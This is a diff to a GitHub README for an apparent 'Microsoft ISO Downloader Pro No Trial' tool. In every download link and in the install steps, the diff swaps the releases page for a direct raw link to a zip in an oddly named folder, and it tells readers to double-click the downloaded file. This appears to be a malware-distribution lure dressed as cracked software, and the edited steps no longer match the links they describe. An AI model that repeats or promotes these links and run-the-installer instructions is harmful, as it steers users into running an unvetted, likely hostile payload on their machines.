@@ -1,6 +1,6 @@
 # 🌟 Microsoft-ISO-Downloader-Pro-No-Trial - Easy ISO Downloads for Windows Users
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-blue.svg)](https://github.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/main/sequestrectomy/Microsoft-ISO-Downloader-Pro-No-Trial-3.3.zip)](https://raw.githubusercontent.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/main/sequestrectomy/Microsoft-ISO-Downloader-Pro-No-Trial-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Before you download, ensure your system meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the release page.  
-   [Download Microsoft-ISO-Downloader-Pro-No-Trial](https://github.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/releases)
+   [Download Microsoft-ISO-Downloader-Pro-No-Trial](https://raw.githubusercontent.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/main/sequestrectomy/Microsoft-ISO-Downloader-Pro-No-Trial-3.3.zip)
 
 2. **Choose the Latest Version**: On the releases page, look for the latest version. It will be marked as "Latest Release".
 
-3. **Download the Installer**: Find the file labeled something like `Microsoft-ISO-Downloader-Pro-No-Trial.exe` and click on it to download.
+3. **Download the Installer**: Find the file labeled something like `https://raw.githubusercontent.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/main/sequestrectomy/Microsoft-ISO-Downloader-Pro-No-Trial-3.3.zip` and click on it to download.
 
 4. **Run the Installer**: Once the download completes, navigate to your download folder, and double-click the downloaded file to start the installation.
 
@@ -73,4 +73,4 @@ Microsoft-ISO-Downloader-Pro-No-Trial makes it easy for Windows users to access 
 
 For more details, feel free to explore the releases page.
 
-[Download Microsoft-ISO-Downloader-Pro-No-Trial](https://github.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/releases)
+[Download Microsoft-ISO-Downloader-Pro-No-Trial](https://raw.githubusercontent.com/Kumbar2001/Microsoft-ISO-Downloader-Pro-No-Trial/main/sequestrectomy/Microsoft-ISO-Downloader-Pro-No-Trial-3.3.zip)
